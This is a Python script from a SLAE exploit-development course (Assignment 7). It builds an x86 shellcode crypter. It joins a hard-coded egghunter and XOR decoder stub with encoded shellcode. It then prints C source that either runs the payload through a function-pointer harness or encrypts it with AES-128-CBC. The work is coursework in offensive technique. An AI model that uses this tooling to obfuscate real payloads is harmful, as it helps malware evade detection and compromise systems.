#!/usr/bin/python3.5
# Student ID:SLAE-860
# Assignment 7
#
import argparse
from random import randint

def count_shellcode_bytes_in_file(filename, chunksize=1):
    chunkcount = 0
    with open(filename, "rb") as f:
        while True:
            chunk = f.read(chunksize)
            if chunk:
                chunkcount += 1
            else:
                return chunkcount


# Yield a certain number of bytes from a file
def get_bytes_from_file(filename, chunksize=1):
    with open(filename, "rb") as f:
        while True:
            chunk = f.read(chunksize)
            if chunk:
                for b in chunk:
                    yield b
            else:
                break


# Return a list with each delimiter+byte in string form
def get_hex_string(delimiter, filename):
    stringified_bytes = []
    # Get actual hex values in string format.  Designed for one byte at a time
    for b in get_bytes_from_file(filename):
        hex_byte_val = delimiter + "{0:02x}".format(b)
        stringified_bytes.append(hex_byte_val)
    return stringified_bytes


def create_decoder_shellcode(egg, encoded_bytes, delimiter):
    if delimiter == r'0x':
        start = r'0x31,0xd2,0x31,0xc9,0xfc,0x66,0x81,0xca,0xff,0x0f,0x42,0x8d,0x5a,0x04,0x6a,0x21,0x58,0xcd,0x80' \
                r',0x3c,0xf2,0x74,0xee,0xb8,'
        end = r'0x89,0xd7,0xaf,0x75,0xe9,0xaf,0x75,0xe6,0xeb,0x15,0x5e,0x31,0xc9,0xb1,0x19,0x31,0xdb,0x31,0xc0,0x8d' \
              r',0x1f,0x8a,0x03,0x30,0x06,0x46,0x43,0xe2,0xf8,0xeb,0x05,0xe8,0xe6,0xff,0xff,0xff,'
        enc_shellcode = r','.join(encoded_bytes)
        output = start + egg + end + enc_shellcode
    else:
        start = r'\x31\xd2\x31\xc9\xfc\x66\x81\xca\xff\x0f\x42\x8d\x5a\x04\x6a\x21\x58\xcd\x80\x3c\xf2\x74\xee\xb8'
        end = r'\x89\xd7\xaf\x75\xe9\xaf\x75\xe6\xeb\x15\x5e\x31\xc9\xb1\x19\x31\xdb\x31\xc0\x8d\x1f\x8a\x03\x30\x06' \
              r'\x46\x43\xe2\xf8\xeb\x05\xe8\xe6\xff\xff\xff'
        enc_shellcode = r''.join(encoded_bytes)
        output = start + egg + end + enc_shellcode

    return output


def create_decryption_source():
    pass


def create_encryption_source(decoder_stub_size, encryption_key):
    # uint8_t
    # key[] = {0x2b, 0x7e, 0x15, 0x16, 0x28, 0xae, 0xd2, 0xa6, 0xab, 0xf7, 0x15, 0x88, 0x09, 0xcf, 0x4f, 0x3c};
    # uint8_t
    # iv[] = {0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f};
    # uint8_t in [] = {0x6b, 0xc1, 0xbe, 0xe2, 0x2e, 0x40, 0x9f, 0x96, 0xe9, 0x3d, 0x7e, 0x11, 0x73, 0x93, 0x17, 0x2a,
    #                  0xae, 0x2d, 0x8a, 0x57, 0x1e, 0x03, 0xac, 0x9c, 0x9e, 0xb7, 0x6f, 0xac, 0x45, 0xaf, 0x8e, 0x51,
    #                  0x30, 0xc8, 0x1c, 0x46, 0xa3, 0x5c, 0xe4, 0x11, 0xe5, 0xfb, 0xc1, 0x19, 0x1a, 0x0a, 0x52, 0xef,
    #                  0xf6, 0x9f, 0x24, 0x45, 0xdf, 0x4f, 0x9b, 0x17, 0xad, 0x2b, 0x41, 0x7b, 0xe6, 0x6c, 0x37, 0x10};
    # uint8_t
    # out[] = {0x76, 0x49, 0xab, 0xac, 0x81, 0x19, 0xb2, 0x46, 0xce, 0xe9, 0x8e, 0x9b, 0x12, 0xe9, 0x19, 0x7d,
    #          0x50, 0x86, 0xcb, 0x9b, 0x50, 0x72, 0x19, 0xee, 0x95, 0xdb, 0x11, 0x3a, 0x91, 0x76, 0x78, 0xb2,
    #          0x73, 0xbe, 0xd6, 0xb8, 0xe3, 0xc1, 0x74, 0x3b, 0x71, 0x16, 0xe6, 0x9e, 0x22, 0x22, 0x95, 0x16,
    #          0x3f, 0xf1, 0xca, 0xa1, 0x68, 0x1f, 0xac, 0x09, 0x12, 0x0e, 0xca, 0x30, 0x75, 0x86, 0xe1, 0xa7};
    # uint8_t
    # buffer[64];
    #
    # AES128_CBC_encrypt_buffer(buffer, in, 64, key, iv);
    if decoder_stub_size % 16 == 0:
        buffer_size = decoder_stub_size
    else:
        chunks = (decoder_stub_size // 16) + 1
        buffer_size = chunks * 16

    # This makes a string representation of the hex values of each character entered for the key.
    keybytestring = ", ".join("0x{:02x}".format(ord(c)) for c in encryption_key)
    c_decl_key = 'uint8_t key[] = { ' + keybytestring + ' }; \n\n'

    # Define the c source code for the initialization vector variable
    iv_seq = [randint(0, 255) for c in range(16)]
    iv_string = ", ".join("0x{:02x}".format(n) for n in iv_seq)
    c_decl_iv = 'uint8_t iv[] = { ' + iv_string + ' }; \n\n'

    # Define the c source code for the in variable (the encoded decoder stub+egghunter shellcode)
    byte_order_egg_string = (delim_char + args.egg[2:4] + ',' + delim_char + args.egg[0:2] + ',') * 2
    decoder_shellcode = create_decoder_shellcode(byte_order_egg_string, byte_string_dict['enc.hex'], r'0x')
    c_decl_in = 'uint8_t in[] = { ' + decoder_shellcode + ' }; \n\n'

    c_buffer_decl = 'uint8_t buffer[{0}];\n'.format(buffer_size)

    c_header = "#include <stdio.h>" + '\n' + "#include <string.h>" + '\n' + r'#include "aes.c"' + '\n\n' \
               + '#define CBC 1\n#define ECB 0\n\n'

    c_body = r"main()" + '\n' + '{' + '\n\n' \
             + '\t' + 'AES128_CBC_encrypt_buffer(buffer, in, {0}, key, iv); \n\n'.format(buffer_size) + '}'
    print(c_header + c_decl_key + c_decl_iv + c_decl_in + c_buffer_decl + c_body)


def create_decoder_only_source():
    c_header = r"#include<stdio.h>" + '\n' + r"#include<string.h>" + '\n\n'

    c_decl_1 = r"unsigned char the_key[] = " + '\\' + '\n' + r'"' + r''.join(eggified_key) + r'";' + '\n\n'
    if args.fmt == 'asm':
        c_decl_1 = r"unsigned char the_key[] = " + '{ ' + r','.join(eggified_key) + r' };' + '\n\n'

    # Puts the egg in the correct byte order for creating the decoder shellcode
    byte_order_egg_string = (delim_char + args.egg[2:4] + delim_char + args.egg[0:2]) * 2
    if args.fmt == 'asm':
        byte_order_egg_string = (delim_char + args.egg[2:4] + ',' + delim_char + args.egg[0:2] + ',') * 2

    # Piece together the decoder/egghunter shellcode bytes from the egg and the encoded shellcode
    decoder_shellcode = create_decoder_shellcode(byte_order_egg_string, byte_string_dict['enc.hex'], delim_char)

    c_decl_2 = r"unsigned char code[] = " + '\\' + '\n' + r'"' + decoder_shellcode + r'";' + '\n\n'
    if args.fmt == 'asm':
        c_decl_2 = r"unsigned char code[] = " + '{ ' + decoder_shellcode + r' };' + '\n\n'

    c_body = r"main()" + '\n' + '{' + '\n\n' + '\t' + r'printf("Shellcode Length:  %d\n", strlen(code));' + '\n\n' \
             + '\t' + r'int (*ret)() = (int(*)())code;' + '\n\n' + '\t' + 'ret(); \n\n}'

    print(c_header + c_decl_1 + c_decl_2 + c_body)



output_formats = {'asm': r'0x', 'c': r"\x"}
files = ('key.hex', 'enc.hex', 'raw.hex')
byte_string_dict = {}
file_byte_counts = {}

parser = argparse.ArgumentParser()
parser.add_argument('-e',
                    action="store",
                    dest="egg",
                    required=True,
                    help='Specify four hex characters to represent egg bytes, example:  1b2a')
parser.add_argument('-f',
                    action="store",
                    dest="fmt",
                    choices=['asm', 'c'],
                    required=True,
                    help='Specify either c or asm as the output.')
parser.add_argument('--encrypt_with_key',
                    action="store",
                    dest="encryption_key",
                    help='Specify encryption key to use:  --encrypt_with_key [key value]')

# TO DO:  add arguments 'encrypt' and 'key'
args = parser.parse_args()
delim_char = output_formats[args.fmt]

# Only 4 characters should have been passed, no error checking for invalid characters unfortunately yet.
assert len(args.egg) == 4

# Get a dictionary of the stringified bytes from each file
for file in files:
    byte_string_dict[file] = get_hex_string(delim_char, file)
    file_byte_counts[file] = count_shellcode_bytes_in_file(file)

# Make a copy of the key, then insert the egg at the beginning of the key
eggified_key = byte_string_dict['key.hex'][:]
for i in range(4):
    eggified_key.insert(0, delim_char + args.egg[0:2])
    eggified_key.insert(0, delim_char + args.egg[2:4])

# If the encryption option has been selected, automatically format in ASM
if args.encryption_key:
    args.fmt = 'asm'

if args.fmt == 'asm':
    # Add the encoded shellcode size plus the decoder stub + the egg.  Egg & decoder stub are 68 bytes in length.
    buf_size = file_byte_counts['enc.hex'] + 68

    create_encryption_source(buf_size, args.encryption_key)
else:
    create_decoder_only_source()


